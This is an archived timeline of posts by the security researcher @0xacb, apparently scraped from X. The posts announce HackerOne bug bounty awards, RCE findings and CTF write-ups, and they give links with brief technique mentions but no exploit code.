    > @d0nutptr @0xacb @Regala_ @JLLiS @Yassineaboukir @plmaltais [pic.x.com/RomLgdCcSC]
    
    **Media:**
    - photo: https://pbs.twimg.com/media/EMVRV4jXkAAYtuN.jpg — no alt text provided by author
    
    **Links in post:** https://samcurry.net/filling-in-the-blanks-exploiting-null-byte-buffer-overflow-for-a-40000-bounty/
    


---

## 2019-04-21 · Post · I was going to drop a tool and a blog post about this technique in a few days. Submitted my first RC


Tags (automatic): RCE


### Post — @0xacb — 2019-04-21 15:38 UTC (2019-04-21 16:38 WAT)

- URL: https://x.com/0xacb/status/1119988684164562950
- Metrics (at fetch): not returned

> I was going to drop a tool and a blog post about this technique in a few days. Submitted my first RCE in a public BB program using this technique with @infosec_au back in January and I've been improving it since then. Now, I'll be releasing my tool as well. https://t.co/bxINKfNrdb

**Links in post:** https://t.co/bxINKfNrdb

**Quoted post** 1119671665548517376: not readable via the API (deleted, private, or withheld).


---

## 2019-01-29 · Post · Bug bounty writeup - Installing arbitrary apps (RCE) via MITM on Samsung phones https://twitter.com/


Tags (automatic): RCE


### Post — @0xacb — 2019-01-29 19:44 UTC (2019-01-29 20:44 WAT)

- URL: https://x.com/0xacb/status/1090334878921568257
- Metrics (at fetch): not returned

> Bug bounty writeup - Installing arbitrary apps (RCE) via MITM on Samsung phones https://twitter.com/Adyta_pt/status/1090326022854197248

**Links in post:** https://twitter.com/Adyta_pt/status/1090326022854197248

**Quoted post (full text):**

    #### Quoted post — @1017169950954450947 — 2019-01-29 19:09 UTC (2019-01-29 20:09 WAT)
    
    - URL: https://x.com/1017169950954450947/status/1090326022854197248
    - Metrics (at fetch): not returned
    
    > Writeup – Samsung Galaxy Apps Store RCE via MITM https://www.adyta.pt/2019/01/29/writeup-samsung-app-store-rce-via-mitm/
    
    **Links in post:** https://www.adyta.pt/2019/01/29/writeup-samsung-app-store-rce-via-mitm/
    


---

## 2018-12-22 · Post · We did it 🔥 RCE on Steam Client! We’ll publish a writeup if we have permission https://twitter.com/k


Tags (automatic): RCE, Memory corruption / native


### Post — @0xacb — 2018-12-22 19:18 UTC (2018-12-22 20:18 WAT)

- URL: https://x.com/0xacb/status/1076557615990259712
- Metrics (at fetch): not returned

> We did it 🔥 RCE on Steam Client! We’ll publish a writeup if we have permission https://twitter.com/kernelpaniek/status/1069203671001587712

**Links in post:** https://twitter.com/kernelpaniek/status/1069203671001587712

**Quoted post (full text):**

    #### Quoted post — @731525029972848644 — 2018-12-02 12:16 UTC (2018-12-02 13:16 WAT)
    
    - URL: https://x.com/731525029972848644/status/1069203671001587712
    - Metrics (at fetch): not returned
    
    > Got a nice bufferoverflow on steam, but unable to exploit due all the added null bytes :’( [pic.x.com/UrBjU17JoE]
    
    **Media:**
    - media `3_1069203640999714816` (details not returned by the API)
    - media `3_1069203640987107328` (details not returned by the API)
    


---

## 2018-12-21 · Post · My life changed 10 months ago when I started doing bug bounties. I’ve collaborated in 35 reports, we


Tags (automatic): Platform: HackerOne


### Post — @0xacb — 2018-12-21 21:34 UTC (2018-12-21 22:34 WAT)

- URL: https://x.com/0xacb/status/1076229417792344067
- Metrics (at fetch): not returned

> My life changed 10 months ago when I started doing bug bounties. I’ve collaborated in 35 reports, went to 7 live-hacking events, I was the H1-202 MVH, and found some critical bugs :) Check out my 2018 Year In Review on @Hacker0x01: https://hackerone.com/0xacb/year-in-review! #TogetherWeHitHarder

**Links in post:** https://hackerone.com/0xacb/year-in-review


---

## 2018-12-05 · Post · GitHub Desktop RCE (OSX) Bug Bounty writeup:


Tags (automatic): RCE


### Post — @0xacb — 2018-12-05 15:37 UTC (2018-12-05 16:37 WAT)

- URL: https://x.com/0xacb/status/1070341449760366594
- Metrics (at fetch): not returned

> GitHub Desktop RCE (OSX) Bug Bounty writeup:
>
> https://pwning.re/2018/12/04/github-desktop-rce/
>
> Thank you @GitHubSecurity for the bounty!

**Links in post:** https://pwning.re/2018/12/04/github-desktop-rce/


---

## 2018-10-27 · Post · Yesterday, @Regala_ gave an amazing Bug Bounty Workshop in my class at the MSc in Information Securi


Tags (automatic): Platform: HackerOne


### Post — @0xacb — 2018-10-27 15:28 UTC (2018-10-27 16:28 WAT)

- URL: https://x.com/0xacb/status/1056206074628452353
- Metrics (at fetch): not returned

> Yesterday, @Regala_ gave an amazing Bug Bounty Workshop in my class at the MSc in Information Security - @UPorto. Students were also challenged to hack a program on @Hacker0x01. Also, thank you @JLLiS and @0xfad0 for helping students doing some recon :) [pic.x.com/EOxGyVKIVe]

**Media:**
- photo: https://pbs.twimg.com/media/DqhkCDVWoAEoD1i.jpg — no alt text provided by author


---

## 2018-08-28 · Post · Yay, I was awarded a $5,000 bounty on @Hacker0x01! Thanks @GitHubSecurity ❤️ Writeup soon! https://h


Tags (automatic): Platform: HackerOne


### Post — @0xacb — 2018-08-28 02:14 UTC (2018-08-28 03:14 WAT)

- URL: https://x.com/0xacb/status/1034262814024716289
- Metrics (at fetch): not returned

> Yay, I was awarded a $5,000 bounty on @Hacker0x01! Thanks @GitHubSecurity ❤️ Writeup soon! https://hackerone.com/0xacb #TogetherWeHitHarder

**Links in post:** https://hackerone.com/0xacb


---

## 2018-07-01 · Post · h1702 CTF was super cool. The last mobile challenge was about exploiting a buffer overflow + canary


Tags (automatic): Mobile / Android / iOS, Memory corruption / native


### Post — @0xacb — 2018-07-01 11:46 UTC (2018-07-01 12:46 WAT)

- URL: https://x.com/0xacb/status/1013388296649666561
- Metrics (at fetch): not returned

> #h1702 CTF was super cool. The last mobile challenge was about exploiting a buffer overflow + canary bypass + ret2libc in a native lib (Android) from a Webview with a JavaScript interface. There was only space for one gadget! (1/3)


---

## 2018-05-23 · Post · Here it is: https://hackerone.com/reports/341876 🔥🔥🔥🔥🔥🔥


Tags (automatic): Platform: HackerOne


### Post — @0xacb — 2018-05-23 21:13 UTC (2018-05-23 22:13 WAT)

- URL: https://x.com/0xacb/status/999397917331992577
- Metrics (at fetch): not returned

> Here it is: https://hackerone.com/reports/341876 🔥🔥🔥🔥🔥🔥
> Thanks to @0xfad0 for the help!
> And thanks for the bounty, @Shopify and @Hacker0x01!!

**Links in post:** https://hackerone.com/reports/341876


---

## 2018-05-23 · Post · Yay, I was awarded a $25,000 bounty on @Hacker0x01! https://hackerone.com/0xacb TogetherWeHitHarder


Tags (automatic): Platform: HackerOne


### Post — @0xacb — 2018-05-23 21:06 UTC (2018-05-23 22:06 WAT)

- URL: https://x.com/0xacb/status/999396162158448641
- Metrics (at fetch): not returned

> Yay, I was awarded a $25,000 bounty on @Hacker0x01! https://hackerone.com/0xacb #TogetherWeHitHarder

**Links in post:** https://hackerone.com/0xacb


---

## 2018-03-25 · Post · Yay, I was awarded a $7,500 bounty on @Hacker0x01! https://hackerone.com/0xacb TogetherWeHitHarder


Tags (automatic): Platform: HackerOne


### Post — @0xacb — 2018-03-25 23:34 UTC (2018-03-26 00:34 WAT)

- URL: https://x.com/0xacb/status/978052569284083715
- Metrics (at fetch): not returned

> Yay, I was awarded a $7,500 bounty on @Hacker0x01! https://hackerone.com/0xacb #TogetherWeHitHarder

**Links in post:** https://hackerone.com/0xacb


---

## 2018-02-27 · Post · I woke up 3 hours ago and this already happened: https://hackerone.com/reports/320355


Tags (automatic): Platform: HackerOne


### Post — @0xacb — 2018-02-27 18:06 UTC (2018-02-27 19:06 WAT)

- URL: https://x.com/0xacb/status/968547852266983426
- Metrics (at fetch): not returned

> I woke up 3 hours ago and this already happened: https://hackerone.com/reports/320355
> Ty @Shopify and @Hacker0x01 for the bounty

**Links in post:** https://hackerone.com/reports/320355


---

## 2018-02-27 · Post · Yay, I was awarded a $1,000 bounty on @Hacker0x01! https://hackerone.com/0xacb TogetherWeHitHarder


Tags (automatic): Platform: HackerOne


### Post — @0xacb — 2018-02-27 17:43 UTC (2018-02-27 18:43 WAT)

- URL: https://x.com/0xacb/status/968542101813243905
- Metrics (at fetch): not returned

> Yay, I was awarded a $1,000 bounty on @Hacker0x01! https://hackerone.com/0xacb #TogetherWeHitHarder

**Links in post:** https://hackerone.com/0xacb


---

## 2018-01-15 · Post · First bug bounty report this year: duplicate 😢


### Post — @0xacb — 2018-01-15 04:01 UTC (2018-01-15 05:01 WAT)

- URL: https://x.com/0xacb/status/952752637258104832
- Metrics (at fetch): not returned

> First bug bounty report this year: duplicate 😢


---

## 2017-12-23 · Post · Bug Bounty goals for 2018:


### Post — @0xacb — 2017-12-23 16:28 UTC (2017-12-23 17:28 WAT)

- URL: https://x.com/0xacb/status/944605735752695810
- Metrics (at fetch): not returned

> Bug Bounty goals for 2018:
> - Start doing bug bounties


---

## 2017-11-20 · Post · Just published my writeup for h1212 CTF: https://pwning.re/2017/11/20/h1-212-writeup/


Tags (automatic): Platform: HackerOne


### Post — @0xacb — 2017-11-20 21:11 UTC (2017-11-20 22:11 WAT)

- URL: https://x.com/0xacb/status/932718133361639425
- Metrics (at fetch): not returned

> Just published my writeup for #h1212 CTF: https://pwning.re/2017/11/20/h1-212-writeup/
> Thanks @jobertabma, @NahamSec and @Hacker0x01 for this awesome challenge!

**Links in post:** https://pwning.re/2017/11/20/h1-212-writeup/


---

## 2017-11-19 · Post · Bypassing FORTIFY_SOURCE with an user-supplied SECCOMP filter (hxpctf Hardened Flag Store Writeup)


### Post — @0xacb — 2017-11-19 23:42 UTC (2017-11-20 00:42 WAT)

- URL: https://x.com/0xacb/status/932393692454932481
- Metrics (at fetch): not returned

> Bypassing FORTIFY_SOURCE with an user-supplied SECCOMP filter (#hxpctf Hardened Flag Store Writeup)
> https://pwning.re/2017/11/19/hxp-flag-store/

**Links in post:** https://pwning.re/2017/11/19/hxp-flag-store/


---

## 2017-11-19 · Post · hardened_flag_store from hxpctf was a pretty cool challenge.


### Post — @0xacb — 2017-11-19 02:53 UTC (2017-11-19 03:53 WAT)

- URL: https://x.com/0xacb/status/932079439567097856
- Metrics (at fetch): not returned

> hardened_flag_store from #hxpctf was a pretty cool challenge.
> I'm going to publish a writeup later!


---

## 2017-06-26 · Post · Google CTF Writeup - Food - Android Reverse Engineering


Tags (automatic): Mobile / Android / iOS


### Post — @0xacb — 2017-06-26 16:29 UTC (2017-06-26 17:29 WAT)

- URL: https://x.com/0xacb/status/879376010130620420
- Metrics (at fetch): not returned

> Google CTF Writeup - Food - Android Reverse Engineering
> http://pwning.re/2017/06/25/google-ctf-food/
> Static + Dynamic Analysis

**Links in post:** http://pwning.re/2017/06/25/google-ctf-food/


---

## 2017-06-21 · Post · https://x.com/ptraughber Bug Bounty Program


### Post — @0xacb — 2017-06-21 13:38 UTC (2017-06-21 14:38 WAT)

- URL: https://x.com/0xacb/status/877521229657329664
- Metrics (at fetch): not returned

> https://x.com/ptraughber Bug Bounty Program
> Excellent idea by @dsopas 
> Let's hope for the best!

**Links in post:** https://x.com/ptraughber


---

## 2017-02-27 · Post · bkpctf Hiddensc writeup (pwn 200): http://pwning.re/2017/02/27/bkp-hidden-sc/


### Post — @0xacb — 2017-02-27 13:06 UTC (2017-02-27 14:06 WAT)

- URL: https://x.com/0xacb/status/836200959630061569
- Metrics (at fetch): not returned

> #bkpctf Hiddensc writeup (pwn 200): http://pwning.re/2017/02/27/bkp-hidden-sc/

**Links in post:** http://pwning.re/2017/02/27/bkp-hidden-sc/


---

## 2017-01-23 · Post · Exploit for baby (pwn 50):


### Post — @0xacb — 2017-01-23 01:25 UTC (2017-01-23 02:25 WAT)

- URL: https://x.com/0xacb/status/823340952450428928
- Metrics (at fetch): not returned

> Exploit for baby (pwn 50):
> http://pwning.re/2017/01/22/insomnihack-teaser-baby/
> #insomnihack

**Links in post:** http://pwning.re/2017/01/22/insomnihack-teaser-baby/


---

## 2017-01-11 · Post · Trying to explain a vuln to @uid1000 : "I still don't know why chrome crashes. He's expecting potato


### Post — @0xacb — 2017-01-11 00:52 UTC (2017-01-11 01:52 WAT)

- URL: https://x.com/0xacb/status/818983830463926272
- Metrics (at fetch): not returned

> Trying to explain a vuln to @uid1000 : "I still don't know why chrome crashes. He's expecting potatoes and I'm feeding him with cabbages"


---

## 2016-12-15 · Post · It's a long way from heap overflow to RCE if there is nothing to overwrite... But it's possible to o


Tags (automatic): RCE, Memory corruption / native


### Post — @0xacb — 2016-12-15 19:44 UTC (2016-12-15 20:44 WAT)

- URL: https://x.com/0xacb/status/809484304552251392
- Metrics (at fetch): not returned

> It's a long way from heap overflow to RCE if there is nothing to overwrite... But it's possible to overwrite free chunk metadata 😎


---

## 2016-11-22 · Post · QiwiCTF pwnable writeup


### Post — @0xacb — 2016-11-22 19:35 UTC (2016-11-22 20:35 WAT)

- URL: https://x.com/0xacb/status/801147152630161409
- Metrics (at fetch): not returned

> #QiwiCTF pwnable writeup
> https://abaptista.github.io/2016/11/22/qiwi-ctf-writeup/

**Links in post:** https://abaptista.github.io/2016/11/22/qiwi-ctf-writeup/


---

## 2016-11-12 · Post · My writeup for E-Cryption - Reverse 400:


### Post — @0xacb — 2016-11-12 21:39 UTC (2016-11-12 22:39 WAT)

- URL: https://x.com/0xacb/status/797554549691219968
- Metrics (at fetch): not returned

> My writeup for E-Cryption - Reverse 400:
> https://abaptista.github.io/2016/11/12/bsides-lisbon-ctf/
> #bsideslisbon #bsideslisbonctf

**Links in post:** https://abaptista.github.io/2016/11/12/bsides-lisbon-ctf/


---

## 2016-10-09 · Post · My writeup for hackover ctf "are_you_serialz" challenge (reverse engineering)


### Post — @0xacb — 2016-10-09 21:45 UTC (2016-10-09 22:45 WAT)

- URL: https://x.com/0xacb/status/785234637866098688
- Metrics (at fetch): bookmark 0, impression 0, like 8, quote 0, reply 0, retweet 3

> My writeup for #hackover #ctf "are_you_serialz" challenge (reverse engineering)
> https://t.co/gG3L1pqdOG


---

## 2016-03-03 · Post · SSCTF 2016 Quals HeHeDa (Crypto 100) Writeup: https://t.co/nG7ztLgDDb


### Post — @0xacb — 2016-03-03 21:37 UTC (2016-03-03 22:37 WAT)

- URL: https://x.com/0xacb/status/705507308332326912
- Metrics (at fetch): bookmark 0, impression 0, like 0, quote 0, reply 0, retweet 0

> #SSCTF 2016 Quals HeHeDa (Crypto 100) Writeup: https://t.co/nG7ztLgDDb


---

## 2014-01-05 · Post · http://t.co/mE5KorMuUC


Tags (automatic): Path normalization


### Post — @0xacb — 2014-01-05 16:58 UTC (2014-01-05 17:58 WAT)

- URL: https://x.com/0xacb/status/419875510852665344
- Metrics (at fetch): bookmark 0, impression 0, like 0, quote 0, reply 0, retweet 0

> http://t.co/mE5KorMuUC
> Forgotten router password? Just hack into the router. Amazing #security
